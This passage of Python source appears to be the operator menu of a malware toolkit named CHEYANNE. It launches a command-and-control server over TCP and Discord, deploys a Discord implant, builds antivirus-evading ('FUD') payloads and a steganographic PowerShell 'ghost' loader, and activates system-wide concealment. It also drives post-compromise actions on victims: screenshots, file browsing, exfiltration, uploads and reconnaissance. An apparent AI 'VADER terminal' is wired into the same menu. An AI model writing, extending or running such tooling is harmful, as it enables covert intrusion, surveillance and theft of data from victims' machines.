        subprocess.run([sys.executable, c2_v2], cwd=ROOT)


def run_op(choice):
    deploy = os.path.join(ROOT, "deploy.py")
    mutate = os.path.join(ROOT, "mutate.py")

    cloak_build = os.path.join(ROOT, "cloak", "build_cloak.py")
    cloak_test  = os.path.join(ROOT, "cloak", "bin", "test_hook.exe")
    cloak_loader = os.path.join(ROOT, "cloak", "bin", "cloak_loader.exe")

    if choice == "1":
        subprocess.run([sys.executable, deploy, "--compile"], cwd=ROOT)
        scan_reminder()
    elif choice == "2":
        subprocess.run([sys.executable, deploy, "--status"], cwd=ROOT)
    elif choice == "3":
        dark = os.path.join(ROOT, "dark_room", "dark_room.exe")
        if os.path.exists(dark):
            subprocess.run([dark, "--test"])
        else:
            print(f"\n  {RED}[!] dark_room.exe not built. Run compile first.{RST}")
    elif choice == "4":
        subprocess.run([sys.executable, mutate], cwd=ROOT)
    elif choice.lower() == "f":
        fresh_build(mutate, deploy)
    elif choice.lower() == "x":
        fresh_build(mutate, deploy, fud=True)
    elif choice == "5":
        subprocess.run([sys.executable, deploy, "--pentest"], cwd=ROOT)
    elif choice == "6":
        subprocess.run([sys.executable, mutate, "--status"], cwd=ROOT)
    elif choice == "7":
        subprocess.run([sys.executable, cloak_build, "--scan"], cwd=ROOT)
    elif choice == "8":
        if os.path.exists(cloak_test):
            subprocess.run([cloak_test], cwd=os.path.join(ROOT, "cloak", "bin"))
        else:
            print(f"\n  {RED}[!] test_hook.exe not built. Build cloak first (option 7).{RST}")
    elif choice == "9":
        if os.path.exists(cloak_loader):
            print(f"\n  {WHITE}[*] Activating system-wide concealment...{RST}")
            print(f"  {DIM}    Press ENTER in the loader window to deactivate.{RST}\n")
            subprocess.run([cloak_loader], cwd=os.path.join(ROOT, "cloak", "bin"))
        else:
            print(f"\n  {RED}[!] cloak_loader.exe not built. Build cloak first (option 7).{RST}")
    elif choice.lower() == "g":
        run_ghost()
    elif choice.lower() == "w":
        ui_script = os.path.join(ROOT, "vader_ui.py")
        if HAS_OPS:
            from cheyanne_ops import port_ensure
            if not port_ensure(8666):
                input(f"\n  {DIM}Press Enter to continue...{RST}")
                return True
        print(f"\n  {BLUE}[*] Launching web dashboard on http://0.0.0.0:8666{RST}")
        subprocess.Popen([sys.executable, ui_script], cwd=ROOT)
        import webbrowser
        import time
        time.sleep(1)
        webbrowser.open("http://127.0.0.1:8666")
    elif choice.lower() == "d":
        c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
        if HAS_OPS:
            from cheyanne_ops import port_ensure
            if not port_ensure(4443):
                input(f"\n  {DIM}Press Enter to continue...{RST}")
                return True
        print(f"\n  {GREEN}[*] Launching CHEYANNE C2 — Dual Channel (TCP + Discord){RST}")
        subprocess.run([sys.executable, c2_v2], cwd=ROOT)
    elif choice.lower() == "b":
        print(f"\n  {CYAN}[*] Discord Implant — Full Deploy Pipeline{RST}")
        subprocess.run([sys.executable, os.path.join(ROOT, "deploy.py"), "--implant-deploy"])
    elif choice.lower() == "a" and choice == "A":
        auto_test = os.path.join(ROOT, "auto_screenshot_test.py")
        if os.path.exists(auto_test):
            subprocess.run([sys.executable, auto_test], cwd=ROOT)
        else:
            print(f"\n  {RED}[!] auto_screenshot_test.py not found{RST}")
    elif choice.lower() == "p":
        _phase0_launch()
    elif choice.lower() == "r":
        _tcp_reconnect_via_discord()
    elif choice.lower() == "z":
        my_ip = detect_lan_ip() or "192.168.1.92"
        print(f"\n  {RED}{BOLD}=== FUD AUTO LOOP — ghost mode ==={RST}")
        print(f"  {DIM}  Ghost loader: XOR-encrypted zero-width steg PS1 — no shellcode patterns{RST}")
        ip   = input(f"  {AMBER}C2 IP [{TEXT}{my_ip}{AMBER}]: {RST}").strip() or my_ip
        port = prompt_port()
        fud_auto = os.path.join(ROOT, "fud_auto.py")
        subprocess.run([sys.executable, fud_auto, "ghost", ip, port, "--scan-only", "--max", "15"], cwd=ROOT)
    elif choice.lower() == "i":
        convert_image()
    elif choice.lower() == "h":
        vader_root = r"C:\Users\gwu07\22DIV"
        vader_py   = os.path.join(vader_root, ".venv", "Scripts", "python.exe")
        if not os.path.exists(vader_py):
            vader_py = sys.executable
        env = {**os.environ, "PYTHONPATH": vader_root}
        print(f"\n  {PINK}[*] Launching 22DIV VADER terminal (sonnet-4-6)...{RST}")
        subprocess.run([vader_py, "-m", "vader.terminal"], cwd=vader_root, env=env)

    # ── PHASE 4: OPERATE ──
    elif choice.lower() == "s" and HAS_OPS:
        op_sessions()
    elif choice.lower() == "t" and HAS_OPS:
        op_screenshot()
    elif choice.lower() == "l" and HAS_OPS:
        op_browse()
    elif choice.lower() == "e" and HAS_OPS:
        op_exfil()
    elif choice.lower() == "u" and HAS_OPS:
        op_upload()
    elif choice.lower() == "n" and HAS_OPS:
        op_recon()
    elif choice.lower() in ("s", "t", "l", "e", "u", "n") and not HAS_OPS:
        print(f"\n  {RED}[!] cheyanne_ops.py not loaded — OPERATE commands unavailable{RST}")

    # ── TYPED SHORTCUTS (accept words, not just keys) ──
    elif choice.lower() == "deploy":
        c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
        if HAS_OPS:
            from cheyanne_ops import port_ensure
            if not port_ensure(4443):
                input(f"\n  {DIM}Press Enter to continue...{RST}")
                return True
        print(f"\n  {GREEN}[*] Launching C2 with deploy shortcut ready...{RST}")
        print(f"  {DIM}  Once connected, type 'deploy' at chey> prompt{RST}")
        subprocess.run([sys.executable, c2_v2], cwd=ROOT)
    elif choice.lower() in ("shell", "c2"):
        c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
        if HAS_OPS:
            from cheyanne_ops import port_ensure
            if not port_ensure(4443):
                input(f"\n  {DIM}Press Enter to continue...{RST}")
                return True
        print(f"\n  {GREEN}[*] Launching CHEYANNE C2...{RST}")
        subprocess.run([sys.executable, c2_v2], cwd=ROOT)

    else:
        print(f"\n  {RED}[!] Unknown command: {choice}{RST}")
        return True

    input(f"\n  {DIM}Press Enter to continue...{RST}")
    return True


def main():
    while True:
        try:
            render()
            choice = input(f"  {GREEN}CHEYANNE >{RST} ").strip()
            if choice == "0" or choice.lower() in ("q", "quit", "exit"):
                print(f"\n  {DIM}The hunt never ends.{RST}\n")
                break
            if not run_op(choice.strip("﻿")):
                if choice.strip("﻿"):
                    print(f"\n  {RED}[!] Unknown command: {choice}{RST}")
                    input(f"  {DIM}Press Enter...{RST}")
        except KeyboardInterrupt:
            print(f"\n  {DIM}[*] Interrupted — back to menu{RST}")
            continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {DIM}The hunt never ends.{RST}\n")
